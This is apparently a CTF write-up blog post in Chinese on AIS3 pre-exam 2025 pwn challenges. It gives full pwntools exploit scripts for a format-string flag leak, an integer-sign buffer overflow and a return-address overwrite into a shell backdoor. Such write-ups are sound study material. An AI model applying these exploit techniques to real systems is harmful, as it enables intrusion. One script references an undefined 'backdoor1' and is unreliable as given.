---
title:  AIS3 pre-exam 2025
date: 2025-06-05
tags: CTF
---


### Format Number

***Source code***

```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <string.h>


void check_format(char *format) {
    for (int i = 0; format[i] != '\0'; i++) {
        char c = format[i];
        if (c == '\n') {
            format[i] = '\0';
            return;
        }
        if (!isdigit(c) && !ispunct(c)) {
            printf("Error format !\n");
            exit(1);
        }
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    srand(time(NULL));
    int number = rand();
    int fd = open("/home/chal/flag.txt", O_RDONLY);
    char flag[0x100] = {0};
    read(fd, flag, 0xff);
    close(fd);
    
    char format[0x10] = {0};
    printf("What format do you want ? ");
    read(0, format, 0xf);
    check_format(format);

    char buffer[0x20] = {0};
    strcpy(buffer, "Format number : %3$");
    strcat(buffer, format);
    strcat(buffer, "d\n");

// "Format number : %3$<format> d\n
    printf(buffer, "Welcome", "~~~", number);

    return 0;
}
```

程式先把 flag 讀入 stack 上，然後後面存在 format string attack


雖然存在 format string attack，但 **check_format()** 阻止使用者輸入英文字母

```c
void check_format(char *format) {
    for (int i = 0; format[i] != '\0'; i++) {
        char c = format[i];
        if (c == '\n') {
            format[i] = '\0';
            return;
        }
        if (!isdigit(c) && !ispunct(c)) {
            printf("Error format !\n");
            exit(1);
        }
    }
}
```

%3\$<user_input>d，使用 ***%*** 去讓 ***%3$*** 失效(也不是失效，應該說 bypass)，然後我們後面就可以接 `%<number>$` 去印出 stack 上面的數值，也就是 flag

***Exploit***

```python
from pwn import *

context.log_level = "debug"
context.arch = "i386"

with open("flag.txt", "w") as f:
    pass

for i in range(20, 70):
    payload = f"%%{i}$"  # '%%19$', '%%20$'
    print(f"[*] Sending payload: {payload}")
    p = remote("chals1.ais3.org", 50960)
    #p = process("./chal")
    p.sendlineafter("What format do you want ?", payload)

    try:
        p.recvuntil("%")
        res = p.recvline(timeout=1)
        print(f"[{i}] => {res}")
        with open("flag.txt", "ab") as f:
            f.write(res)
    except:
        print(f"[{i}] => (no response)")
        with open("flag.txt", "a") as f:
            f.write(f"[{i}] => (no response)\n")

    p.close()
```

### Welcome to the World of Ave Mujica🌙

> 簡單的 bof

***Decompile*** 

> Key idea:注意 ***read(0, buf, int8);*** 如果 ***int8*** 可控，那就可以 overflow

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[143]; // [rsp+0h] [rbp-A0h] BYREF
  char s[8]; // [rsp+8Fh] [rbp-11h] BYREF
  unsigned __int8 int8; // [rsp+97h] [rbp-9h]
  char *v7; // [rsp+98h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("\x1B[2J\x1B[1;1H");
  printf("\x1B[31m");
  printf("%s", (const char *)banner);
  puts(&byte_402A78);
  puts(&byte_402AB8);
  fgets(s, 8, stdin);
  v7 = strchr(s, '\n');
  if ( v7 )
    *v7 = 0;
  if ( strcmp(s, "yes") )
  {
    puts(&byte_402AE8);
    exit(1);
  }
  printf(&byte_402B20);
  int8 = read_int8();
  printf(&byte_402B41);
  read(0, buf, int8);
  return 0;
}
```

這個 function 檢查了上限，但沒檢查下限，然後把 ***sign integer*** 轉成 ***unsign integer***

```c
__int64 read_int8()
{
  char buf[4]; // [rsp+8h] [rbp-8h] BYREF
  int v2; // [rsp+Ch] [rbp-4h]

  read(0, buf, 4uLL);
  v2 = atoi(buf);
  if ( v2 > 127 )
  {
    puts(&byte_402A38);
    exit(1);
  }
  return (unsigned int)v2;
}
```



***Exploit***

```python
from pwn import *

context.log_level="debug"
context.arch="amd64"
#context.terminal = ['tmux','splitw','h']

#p = process("./chal")
p = remote("chals1.ais3.org",60761)
backdoor = 0x0000000000401256

payload = b'a' * 0xa8 + p64(backdoor)


p.sendlineafter("?",b"yes")
p.sendlineafter(":",str(-50))
p.sendlineafter(":",payload)

p.interactive()
```


### MyGO schedule manager α

***source code***

```cpp
#include <iostream>
#include <vector>
#include <string>
#include <cstring> 
#include <cstdlib>

// g++ chal.cpp -o chal1 -no-pie -z relro -z now -g

struct schedule{
    char title[0x16];
    std::string content;
};

int SCHEDULE_STATUS = 0;
schedule* sched = nullptr;

void init_proc(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    std::cin.rdbuf()->pubsetbuf(nullptr, 0);
    std::cout.rdbuf()->pubsetbuf(nullptr, 0);
    
    puts("+======= alpha ========+");
    puts("| Band schedule system |");
    puts("+======================+");
    
}

void debug_backdoor(){
    system("/bin/sh");
}

void menu(){
    puts("+======================+");
    puts("| (1) create schedule  |");
    puts("| (2) edit title       |");
    puts("| (3) edit content     |");
    puts("| (4) show schedule    |");
    puts("+======================+");
    printf("< MyGO @ ScheduleManager $ > ");
}

int get_choice(){
    int choice;
    scanf("%d", &choice);
    return choice;
}

void create(){
    if(SCHEDULE_STATUS == 0){
        sched = new(std::nothrow) schedule;
        if (sched == nullptr) {
            puts("[x] Memory allocation failed!");
            exit(0);
        }
        
        puts("MyGO @ sched title > ");
        std::cin >> sched->title;
        puts("MyGO @ sched content > ");
        std::cin >> sched->content;
        
        SCHEDULE_STATUS = 1;

        puts("[!] Create Success !!!");
    } else {
        puts("[x] Your schedule have been created");
        return;
    }
}

void edit_title(){
    if (SCHEDULE_STATUS == 1){
        puts("MyGO @ sched title > ");
        std::cin >> sched->title;
        puts("[!] Edit Success");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    } 
}

void edit_content(){
    if (SCHEDULE_STATUS == 1){
        puts("MyGO @ sched content > ");
        std::cin >> sched->content;
        puts("[!] Edit Success");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    } 
}

void show(){
    if (SCHEDULE_STATUS == 1){
        printf("===== Schedule =====\n");
        printf("MyGO @ Title : %15s\n", sched -> title);
        printf("MyGO @ Content : %s\n", sched -> content.c_str());
        printf("====================\n");
    } else {
        puts("[x] Schdule Not Found ... ");
        return;
    }
}

void login(){
    char username[0x10];  
    char password[0x10]; 
    
    printf("Username > ");
    scanf("%15s", username);

    printf("Password > ");
    scanf("%15s", password);
    
    if (strcmp(username, "u") == 0 && strcmp(password, "p") == 0){
        puts("\033[34m");
        puts("=========================================");
        puts("                  ____    _____      ");  
        puts(" /'\\_/`\\         /\\  _`\\ /\\  __`\\    ");  
        puts("/\\      \\  __  __\\ \\ \\L\\_\\ \\ \\/\\ \\   ");  
        puts("\\ \\ \\__\\ \\/\\ \\/\\ \\\\ \\ \\L_L\\ \\ \\ \\ \\  ");  
        puts(" \\ \\ \\_/\\ \\ \\ \\_\\ \\\\ \\ \\/, \\ \\ \\_\\ \\ ");  
        puts("  \\ \\_\\\\ \\_\\/`____ \\\\ \\____/\\ \\_____\\");  
        puts("   \\/_/ \\/_/`/___/> \\\\/___/  \\/_____/");  
        puts("               /\\___/                 ");  
        puts("               \\/__/                  ");  
        puts("=========================================");
        puts("\033[0m");
        puts("[!] This is a system that can manage your band schedule.");
        return;
    } else {
        puts("[x] Verify Failed");
        exit(0);
    }
}

int main()
{
    init_proc();
    
    int choice;
    int index;
    
    login();
    
    while(1){
        menu();
        choice = get_choice();
        if (choice == 1){
            create();
        } else if (choice == 2){
            edit_title();
        } else if (choice == 3){
            edit_content();
        } else if (choice == 4){
            show();
        } else {
            break;
        }
        
    }
    return 0;
}
```

創建一個結構，結構如下:

```cpp
struct schedule{
    char title[0x16];
    std::string content;
};

struct std::string{
    void *ptr (pointer to string);
    int length;
}
```
可以分別對 *title* 以及 *content* 做修改以及展示(*show*)

如果 *title* 存在 *overflow*，蓋過 *content* 的 `void *ptr (pointer to string);` ，那就存在任意位置讀寫

可以看到 ***edit_title()*** 接使用者輸入的方式 `std::cin`
，`std::cin` 不會檢查使用者輸入的長度，所以確定存在 *overflow*，並且存在任意位置讀寫

```cpp
std::cin >> sched->title;
```


程式存在後門 `debug_backdoor()`

```c
void debug_backdoor(){
    system("/bin/sh");
}
```

**目前已知:**

> 存在任意位置讀寫，有後門，那這樣思路很清晰了，我們的目標是把後們的位置塞入 `main` 的 `return address`，但是不知道 stack 的位置




![image](https://hackmd.io/_uploads/H1aCAPrMle.png)

可以先 *leak* 出　*libc* 位置，然後找到 *environ* 的位置，*leak* 出 *stack* 的位置，然後斷點下在 *main* 的 *return*，觀察 *environ* 和 *return address* 差多少 *bytes*

> 話說這題的環境一直搞不好，後來直接開一個 *docker* 在裡面 *debug*

***Exploit***

```python
from pwn import *
'''
struct schedule{
    char title[0x16];
    std::string content;
};

struct std::string{
    void *ptr (pointer to string);
    int length;
}

'''

context.log_level="debug"
context.arch="amd64"
#context.terminal = ['tmux','splitw','h']

p = process("./chal")
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
user_name = "MyGO!!!!!"
password = "TomorinIsCute"
backdoor = 0x4013ec
fini_array = 0x403d38
libc_start_main_got = 0x0000000000403fe8
stdout_got = 0x0000000000404040

#login
p.sendlineafter("Username > ",str(user_name))
p.sendlineafter("Password > ",str(password))

#create
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(1))
p.sendlineafter("MyGO @ sched title >",b'a' * 23)
p.sendlineafter("MyGO @ sched content >",b'b')


# leak libc base address
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(2))
p.sendlineafter("MyGO @ sched title >",b'a' * 24 + p64(stdout_got))
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(4))
p.recvuntil("MyGO @ Content : ")

stdout_address = u64(p.recv(6).ljust(8,b'\x00'))
success("stdout -> "+ hex(stdout_address))
libc_addr = stdout_address - 0x1f3780
lib.address = libc_addr
success("libc base address->" + hex(libc_addr))

#leak stack base address
environ = libc_addr + 0x1fa200
success("environ-> " + hex(environ))
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(2))
p.sendlineafter("MyGO @ sched title >",b'a' * 24 + p64(environ))
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(4))
p.recvuntil("MyGO @ Content : ")

stack = u64(p.recv(6).ljust(8,b'\x00'))

success("stack base address->" + hex(stack))

return_address = stack -0x120

#hijack control flow
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(2))
p.sendlineafter("MyGO @ sched title >",b'a' * 24 + p64(return_address))
p.sendlineafter("< MyGO @ ScheduleManager $ > ",str(3))
p.sendlineafter("MyGO @ sched content > ",p64(backdoor1))


#gdb.attach(p,'b *0x401921',api=True)


p.interactive()

```










## Reverse

### AIS3 Tiny Server - Reverse

    
丟 ida，然後看到這個 function，可以看到 129 行那邊的條件判斷，如果 `sub_1E20(p_s)` 返回 true，就會執行 `sub_1F90(fd, 200, (int)"Flag Correct!", "Congratulations! You found the correct flag!", 0);`   

```c=
int __cdecl sub_2110(int fd, int a2)
{
  char *p_s; // esi
  char v3; // al
  char *v4; // eax
  char *v5; // eax
  int result; // eax
  int v7; // eax
  char *v8; // edi
  _BYTE *v9; // esi
  char *v10; // ebp
  __int16 v11; // ax
  signed int v12; // ecx
  char *v13; // eax
  __int16 v14; // [esp+Dh] [ebp-102Bh] BYREF
  char v15; // [esp+Fh] [ebp-1029h]
  _DWORD v16[2]; // [esp+10h] [ebp-1028h] BYREF
  char v17; // [esp+18h] [ebp-1020h]
  char s; // [esp+19h] [ebp-101Fh] BYREF
  _BYTE v19[1024]; // [esp+410h] [ebp-C28h] BYREF
  unsigned __int8 v20; // [esp+810h] [ebp-828h] BYREF
  char v21[1023]; // [esp+811h] [ebp-827h] BYREF
  _DWORD v22[3]; // [esp+C10h] [ebp-428h] BYREF
  char v23; // [esp+C1Ch] [ebp-41Ch] BYREF

  *(_DWORD *)(a2 + 512) = 0;
  *(_DWORD *)(a2 + 516) = 0;
  v22[0] = fd;
  v22[1] = 0;
  v22[2] = &v23;
  sub_17E0(v22, v16, 1024);
  __isoc99_sscanf(v16, "%s %s", v19, &v20);
  do
  {
    if ( LOBYTE(v16[0]) == 10 || BYTE1(v16[0]) == 10 )
    {
      result = v20;
      v8 = (char *)&v20;
      v9 = (_BYTE *)a2;
      if ( v20 == 47 )
      {
        v8 = v21;
        v12 = strlen(v21);
        if ( !v12 )
        {
          v15 = 0;
          v8 = ".";
          v14 = 0;
          LOBYTE(result) = 46;
          goto LABEL_24;
        }
        v13 = v21;
        while ( *v13 != 63 )
        {
          if ( v12 <= ++v13 - (char *)&v20 - 1 )
          {
            v9 = (_BYTE *)a2;
            result = (unsigned __int8)v21[0];
            goto LABEL_23;
          }
        }
        *v13 = 0;
        v9 = (_BYTE *)a2;
        result = (unsigned __int8)v21[0];
      }
LABEL_23:
      v15 = 0;
      v14 = 0;
      if ( !(_BYTE)result )
      {
LABEL_29:
        *v9 = 0;
        return result;
      }
LABEL_24:
      v10 = v8;
      while ( 1 )
      {
        ++v9;
        if ( (_BYTE)result == 37 )
        {
          v11 = *(_WORD *)(v10 + 1);
          v10 += 3;
          v14 = v11;
          *(v9 - 1) = strtoul((const char *)&v14, 0, 16);
          result = (unsigned __int8)*v10;
          if ( !(_BYTE)result )
            goto LABEL_29;
        }
        else
        {
          ++v10;
          *(v9 - 1) = result;
          result = (unsigned __int8)*v10;
          if ( !(_BYTE)result )
            goto LABEL_29;
        }

```

![image](https://hackmd.io/_uploads/SkAT63tfge.png)

### 心得
    
![image](https://hackmd.io/_uploads/H1Xfkatzxe.png)